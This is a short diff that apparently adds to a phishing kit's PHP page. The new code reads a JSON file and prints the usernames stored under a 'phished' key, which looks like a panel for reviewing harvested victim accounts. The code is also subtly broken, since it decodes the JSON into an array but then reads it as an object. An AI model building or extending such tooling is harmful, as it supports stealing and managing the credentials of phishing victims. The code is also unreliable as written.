@@ -10,5 +10,16 @@
     <?php
         include "inc/header.php";
     ?>
+    <?php
+        $string = file_get_contents("database.json");
+        if ($string === false) {
+            echo "DataBase not connected";
+        } else {
+            $json_a = json_decode($string, true);
+            foreach ($json_a->phished as $phishedMan) {
+              echo "<p>".$phishedMan['username']."</p><br>";
+            }
+        }
+    ?>
 </body>
 </html>
